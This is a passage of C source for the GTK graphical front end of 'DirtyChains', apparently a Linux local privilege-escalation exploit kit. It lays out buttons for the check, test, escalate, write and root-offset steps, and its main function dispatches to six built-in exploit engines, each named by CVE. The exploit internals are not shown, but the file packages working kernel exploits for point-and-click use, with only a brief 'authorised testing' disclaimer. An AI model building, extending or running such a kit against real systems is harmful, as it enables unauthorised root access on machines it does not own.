    frame_params = gtk_frame_new("参数");
    gtk_style_context_add_class(gtk_widget_get_style_context(frame_params), "card");
    gtk_widget_set_margin_start(frame_params, 12);
    gtk_widget_set_margin_end(frame_params, 12);
    gtk_widget_set_margin_top(frame_params, 8);
    {
        GtkWidget *inner = gtk_box_new(GTK_ORIENTATION_VERTICAL, 4);
        GtkWidget *p = build_params(a);

        gtk_widget_set_margin_start(p, 10);
        gtk_widget_set_margin_end(p, 10);
        gtk_widget_set_margin_top(p, 8);
        gtk_widget_set_margin_bottom(p, 8);
        gtk_box_pack_start(GTK_BOX(inner), p, FALSE, FALSE, 0);
        gtk_container_add(GTK_CONTAINER(frame_params), inner);
    }

    /* ── 按钮区 ── */
    frame_actions = gtk_box_new(GTK_ORIENTATION_HORIZONTAL, 0);
    gtk_widget_set_margin_start(frame_actions, 12);
    gtk_widget_set_margin_end(frame_actions, 12);
    gtk_widget_set_margin_top(frame_actions, 8);
    gtk_box_pack_start(GTK_BOX(frame_actions), build_actions(a), TRUE, TRUE, 0);

    /* ── 日志 ── */
    pane = build_log_pane(a);
    gtk_widget_set_margin_start(pane, 12);
    gtk_widget_set_margin_end(pane, 12);
    gtk_widget_set_margin_top(pane, 8);
    gtk_widget_set_margin_bottom(pane, 6);
    gtk_widget_set_vexpand(pane, TRUE);

    /* ── 状态栏 ── */
    gtk_widget_set_margin_start(statusbar, 12);
    gtk_widget_set_margin_end(statusbar, 12);
    gtk_widget_set_margin_bottom(statusbar, 8);

    a->spinner = gtk_spinner_new();
    gtk_box_pack_start(GTK_BOX(statusbar), a->spinner, FALSE, FALSE, 0);

    a->status_lbl = gtk_label_new("就绪");
    gtk_widget_set_name(a->status_lbl, "status-run");
    gtk_label_set_xalign(GTK_LABEL(a->status_lbl), 0.0f);
    gtk_box_pack_start(GTK_BOX(statusbar), a->status_lbl, TRUE, TRUE, 0);

    {
        GtkWidget *env = gtk_label_new(NULL);
        gtk_widget_set_name(env, "hint");
        g_snprintf(status, sizeof(status), "%s · %s · 内核 %s",
                   user_name(), getuid() == 0 ? "root" : "普通用户",
                   kernel_release());
        gtk_label_set_text(GTK_LABEL(env), status);
        gtk_box_pack_end(GTK_BOX(statusbar), env, FALSE, FALSE, 0);
    }

    /* head 会在下面的左右两栏里并入左栏, 不再单独整宽堆到 vbox */

    /* ── 任务抽屉 (左上角「展开」控制, 从左侧推挤出来) ── */
    a->revealer = gtk_revealer_new();
    gtk_revealer_set_transition_type(GTK_REVEALER(a->revealer),
                                     GTK_REVEALER_TRANSITION_TYPE_SLIDE_RIGHT);
    gtk_revealer_set_transition_duration(GTK_REVEALER(a->revealer), 180);
    gtk_revealer_set_reveal_child(GTK_REVEALER(a->revealer), FALSE);
    gtk_widget_set_vexpand(a->revealer, TRUE);
    gtk_widget_set_valign(a->revealer, GTK_ALIGN_FILL);
    gtk_container_add(GTK_CONTAINER(a->revealer), build_task_sidebar(a));

    /* ── 「漏洞选择」框: 选中多链类别 (OOB/越界写类) 时才滑出 ── */
    {
        GtkWidget *frame = gtk_frame_new(NULL);
        GtkWidget *inner = gtk_box_new(GTK_ORIENTATION_VERTICAL, 4);
        GtkWidget *row = gtk_box_new(GTK_ORIENTATION_HORIZONTAL, 8);
        GtkWidget *lbl = gtk_label_new(NULL);

        gtk_style_context_add_class(gtk_widget_get_style_context(frame),
                                    "card");
        gtk_label_set_markup(GTK_LABEL(lbl), "<b>漏洞选择</b>");
        gtk_widget_set_halign(lbl, GTK_ALIGN_START);
        gtk_widget_set_tooltip_text(lbl, "同一类别里有多个漏洞时, 在这里挑具体用哪个");

        a->cve_combo = gtk_combo_box_text_new();
        gtk_widget_set_size_request(a->cve_combo, 240, -1);
        gtk_widget_set_halign(a->cve_combo, GTK_ALIGN_START);
        a->cve_combo_sig = g_signal_connect(a->cve_combo, "changed",
                                            G_CALLBACK(on_cve_combo_changed), a);
        gtk_box_pack_start(GTK_BOX(row), lbl, FALSE, FALSE, 0);
        gtk_box_pack_start(GTK_BOX(row), a->cve_combo, FALSE, FALSE, 0);
        gtk_box_pack_start(GTK_BOX(inner), row, FALSE, FALSE, 0);

        gtk_widget_set_margin_start(inner, 10);
        gtk_widget_set_margin_end(inner, 10);
        gtk_widget_set_margin_top(inner, 8);
        gtk_widget_set_margin_bottom(inner, 8);
        gtk_container_add(GTK_CONTAINER(frame), inner);

        a->cve_revealer = gtk_revealer_new();
        gtk_revealer_set_transition_type(GTK_REVEALER(a->cve_revealer),
                                         GTK_REVEALER_TRANSITION_TYPE_SLIDE_DOWN);
        gtk_revealer_set_transition_duration(GTK_REVEALER(a->cve_revealer), 160);
        gtk_revealer_set_reveal_child(GTK_REVEALER(a->cve_revealer), FALSE);
        gtk_container_add(GTK_CONTAINER(a->cve_revealer), frame);
    }
    {
        GtkWidget *cve = a->cve_revealer;

        gtk_widget_set_margin_start(cve, 12);
        gtk_widget_set_margin_end(cve, 12);
        gtk_widget_set_margin_top(cve, 8);
    }
    /*
     * 左右两栏: 左栏放标题/说明、漏洞选择、参数、按钮;
     * 右栏整列放日志 (原来日志在底部整宽, 现在挪到右侧红框的位置)。
     * 底部的状态栏仍整宽, 横跨两栏。
     */
    {
        GtkWidget *body = gtk_box_new(GTK_ORIENTATION_HORIZONTAL, 0);
        GtkWidget *leftcol = gtk_box_new(GTK_ORIENTATION_VERTICAL, 0);

        /* 左栏 */
        gtk_box_pack_start(GTK_BOX(leftcol), head, FALSE, FALSE, 0);
        gtk_box_pack_start(GTK_BOX(leftcol), a->cve_revealer, FALSE, FALSE, 0);
        gtk_box_pack_start(GTK_BOX(leftcol), frame_params, FALSE, FALSE, 0);
        gtk_box_pack_start(GTK_BOX(leftcol), frame_actions, FALSE, FALSE, 0);
        gtk_widget_set_hexpand(leftcol, TRUE);
        gtk_widget_set_vexpand(leftcol, TRUE);
        gtk_widget_set_valign(leftcol, GTK_ALIGN_FILL);

        /* 右栏: 日志。固定列宽, 高度随内容区铺满 */
        gtk_widget_set_size_request(pane, 360, -1);
        gtk_widget_set_hexpand(pane, FALSE);
        gtk_widget_set_vexpand(pane, TRUE);
        gtk_widget_set_valign(pane, GTK_ALIGN_FILL);

        gtk_box_pack_start(GTK_BOX(body), leftcol, TRUE, TRUE, 0);
        gtk_box_pack_start(GTK_BOX(body), pane, FALSE, TRUE, 0);
        gtk_widget_set_vexpand(body, TRUE);

        gtk_box_pack_start(GTK_BOX(vbox), body, TRUE, TRUE, 0);
    }
    gtk_box_pack_start(GTK_BOX(vbox), statusbar, FALSE, FALSE, 0);

    gtk_widget_set_hexpand(vbox, TRUE);
    gtk_widget_set_vexpand(vbox, TRUE);
    gtk_widget_set_halign(vbox, GTK_ALIGN_FILL);
    gtk_widget_set_valign(vbox, GTK_ALIGN_FILL);

    /* 抽屉在主内容左边, 展开时把正文推开而不是盖住 */
    {
        GtkWidget *shell = gtk_box_new(GTK_ORIENTATION_HORIZONTAL, 0);

        gtk_box_pack_start(GTK_BOX(shell), a->revealer, FALSE, FALSE, 0);
        gtk_box_pack_start(GTK_BOX(shell), vbox, TRUE, TRUE, 0);
        gtk_widget_set_halign(shell, GTK_ALIGN_FILL);
        gtk_widget_set_valign(shell, GTK_ALIGN_FILL);
        gtk_overlay_add_overlay(GTK_OVERLAY(overlay), shell);
    }

    /* 列表初始选中项跟随下拉框 */
    side_select(a, gtk_combo_box_get_active(GTK_COMBO_BOX(a->combo)));

    /* ── 信号 ── */
    g_signal_connect(a->combo, "changed", G_CALLBACK(on_combo_changed), a);
    g_signal_connect(a->btn_check, "clicked", G_CALLBACK(act_check), a);
    g_signal_connect(a->btn_test, "clicked", G_CALLBACK(act_test), a);
    g_signal_connect(a->btn_find, "clicked", G_CALLBACK(act_find), a);
    g_signal_connect(a->btn_lpe, "clicked", G_CALLBACK(act_lpe), a);
    g_signal_connect(a->btn_write, "clicked", G_CALLBACK(act_write), a);
    g_signal_connect(a->btn_vmlinux, "clicked", G_CALLBACK(act_vmlinux), a);
    g_signal_connect(a->btn_pick_offset, "clicked", G_CALLBACK(act_pick_offset), a);
    g_signal_connect(a->btn_root_off, "clicked", G_CALLBACK(act_root_offset), a);
    g_signal_connect(a->btn_stop, "clicked", G_CALLBACK(act_stop), a);
    g_signal_connect(a->btn_send, "clicked", G_CALLBACK(act_send), a);
    g_signal_connect(a->btn_ctrlc, "clicked", G_CALLBACK(act_ctrlc), a);
    g_signal_connect(a->entry_input, "activate", G_CALLBACK(on_entry_activate), a);
    g_signal_connect(a->window, "destroy", G_CALLBACK(on_window_destroy), a);

    /* 浏览按钮: file-set 后把本地路径填进 entry */
    /* (在 build_params 里已断开错误连接, 这里统一重连) */

    update_desc(a);

    /* root 警告 */
    if (getuid() == 0) {
        gtk_label_set_text(GTK_LABEL(a->banner_lbl),
                           "当前以 root 运行：提权链无法证明有效，-test 结果也没有参考价值。"
                           "请用普通用户身份启动本程序。");
        gtk_widget_set_no_show_all(a->banner, FALSE);
        gtk_widget_show_all(a->banner);
    }
}

/* ---------------------------------------------------------------------------
 * main
 * ------------------------------------------------------------------------ */
int main(int argc, char **argv)
{
    App app;
    const char *poc = NULL;
    const char *bg = NULL;
    int i, j;

    /*
     * 内部引擎模式: GUI 启动子进程时 exec 自身并加上 --engine,
     * 这里把参数原样转给链接进来的 poc 入口, 行为与独立 poc 完全一致。
     */
    if (argc > 1 && !strcmp(argv[1], "--engine")) {
        int rc;

        argv++;
        argc--;
        argv[0] = (char *)"dirtychains";
        rc = dirtychains_poc_main(argc, argv);
        fflush(NULL);
        return rc;
    }

    /* 第二条内置引擎: CVE-2026-64531 (OVS)，入口名不同 */
    if (argc > 1 && !strcmp(argv[1], "--ovs")) {
        int rc;

        argv++;
        argc--;
        argv[0] = (char *)"dirtychains";
        rc = ovswrap_main(argc, argv);
        fflush(NULL);
        return rc;
    }

    /* 第三条内置引擎: CVE-2026-46300 (Fragnesia)，上游 PoC 的 main 直接搬进来 */
    if (argc > 1 && !strcmp(argv[1], "--frag")) {
        int rc;

        argv++;
        argc--;
        argv[0] = (char *)"dirtychains";
        rc = fragnesia_main(argc, argv);
        fflush(NULL);
        return rc;
    }

    /* 第四条内置引擎: CVE-2026-43503 (DirtyClone) */
    if (argc > 1 && !strcmp(argv[1], "--cve43503")) {
        int rc;

        argv++;
        argc--;
        argv[0] = (char *)"dirtychains";
        rc = cve43503_main(argc, argv);
        fflush(NULL);
        return rc;
    }

    /* 第五条内置引擎: CVE-2026-31635 (DirtyDecrypt) */
    if (argc > 1 && !strcmp(argv[1], "--cve31635")) {
        int rc;

        argv++;
        argc--;
        argv[0] = (char *)"dirtychains";
        rc = cve31635_main(argc, argv);
        fflush(NULL);
        return rc;
    }

    /* 第六条内置引擎: CVE-2026-74469 (DiagSpill) */
    if (argc > 1 && !strcmp(argv[1], "--diagspill")) {
        int rc;

        argv++;
        argc--;
        argv[0] = (char *)"dirtychains";
        rc = diagspill_main(argc, argv);
        fflush(NULL);
        return rc;
    }

    memset(&app, 0, sizeof(app));
    app.master_fd = -1;
    app.cur_fg = -1;
    app.csi = g_string_new(NULL);
    app.run = g_string_new(NULL);

    /* 先摘掉自己的参数, 免得 gtk_init 报错 */
    for (i = 1, j = 1; i < argc; i++) {
        if (!strcmp(argv[i], "--poc") && i + 1 < argc) {
            poc = argv[++i];
            continue;
        }
        if (!strcmp(argv[i], "--bg") && i + 1 < argc) {
            bg = argv[++i];
            continue;
        }
        if (!strcmp(argv[i], "--help") || !strcmp(argv[i], "-h")) {
            printf("用法: %s [--poc <路径>] [--bg <图片>]\n\n"
                   "  --poc <路径>   改用外部 poc 可执行文件 (默认用内置引擎,\n"
                   "                 也可用环境变量 DIRTYCHAINS_POC)\n"
                   "  --bg  <图片>   指定窗口背景图 (默认找同目录 bg.png,\n"
                   "                 其次 assets/bg.png 与 /usr/share/dirtychains/)\n"
                   "                 也可用环境变量 DIRTYCHAINS_BG\n", argv[0]);
            return 0;
        }
        argv[j++] = argv[i];
    }
    argc = j;
    argv[argc] = NULL;

    app.poc_path = find_poc(poc, &app.poc_builtin);
    app.bg_path = find_bg(bg);

    gtk_init(&argc, &argv);
    install_css();

    if (app.bg_path) {
        GError *err = NULL;

        app.bg_pix = gdk_pixbuf_new_from_file(app.bg_path, &err);
        if (!app.bg_pix) {
            fprintf(stderr, "背景图加载失败 (%s): %s\n", app.bg_path,
                    err ? err->message : "未知错误");
            g_clear_error(&err);
        }
    }

    build_window(&app);

    gtk_widget_show_all(app.window);

    /* 未选择 CVE: 参数面板隐藏 OVS 专属行 (内核版本) */
    sync_params_ui(&app);

    /* 启动横幅写入日志 */
    {
        char head[512];
        g_snprintf(head, sizeof(head),
                   "\033[36mDirtyChains 十链本地提权 PoC\033[0m  图形前端"
                   "  \033[2m构建 %s\033[0m\n"
                   "\033[2m引擎: %s\033[0m\n"
                   "\033[2m仅供参考与授权测试。先用「检查配置」和「自测」判断本机可用性。\033[0m\n",
                   DF_BUILD,
                   app.poc_builtin ? "内置 (本程序 --engine)"
                                   : (app.poc_path ? app.poc_path : "未找到"));
        ansi_feed(&app, head, strlen(head));
        log_flush(&app);
    }

    if (!app.poc_path) {
        log_append_plain(&app,
                         "\n[!] 引擎不可用 (无法定位本程序路径)。\n"
                         "    可用 --poc <路径> 指定外部 poc。\n");
        gtk_label_set_text(GTK_LABEL(app.status_lbl), "引擎不可用");
        gtk_widget_set_name(app.status_lbl, "status-err");
    }

    gtk_main();

    if (app.csi)
        g_string_free(app.csi, TRUE);
    if (app.run)
        g_string_free(app.run, TRUE);
    g_free(app.poc_path);
    g_free(app.bg_path);
    if (app.bg_pix)
        g_object_unref(app.bg_pix);
    if (app.bg_surf)
        cairo_surface_destroy(app.bg_surf);

    return app.last_exit ? 1 : 0;
}

#endif /* !OVSWRAP_STANDALONE */
